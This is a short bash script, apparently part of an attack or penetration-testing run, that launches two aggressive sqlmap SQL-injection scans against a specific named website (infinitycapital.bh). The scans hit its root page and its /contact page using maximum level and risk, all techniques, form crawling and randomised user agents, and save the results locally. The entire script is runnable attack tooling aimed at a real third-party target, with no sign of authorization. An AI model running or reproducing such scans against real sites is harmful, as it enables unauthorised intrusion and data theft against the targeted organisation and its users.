#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
cd "$WORK_PATH"
mkdir -p d11
B="https://www.infinitycapital.bh"

echo "### 1) sqlmap on /  (params: page, search, id, zzz)"
sqlmap -u "$B/?id=1&search=test&page=2&zzz=1" \
  --batch --level=5 --risk=3 --threads=4 --timeout=20 --retries=1 \
  --random-agent --dbms=* --technique=BEUSTQ --forms \
  -p "id,search,page,zzz" -o d11/sqlmap_root.txt 2>&1 | tail -35

echo "### 2) sqlmap on /contact (params: cb, x, q)"
sqlmap -u "$B/contact?cb=1&x=1&q=1" \
  --batch --level=5 --risk=3 --threads=4 --timeout=20 --retries=1 \
  --random-agent --dbms=* --technique=BEUSTQ \
  -p "cb,x,q" -o d11/sqlmap_contact.txt 2>&1 | tail -25
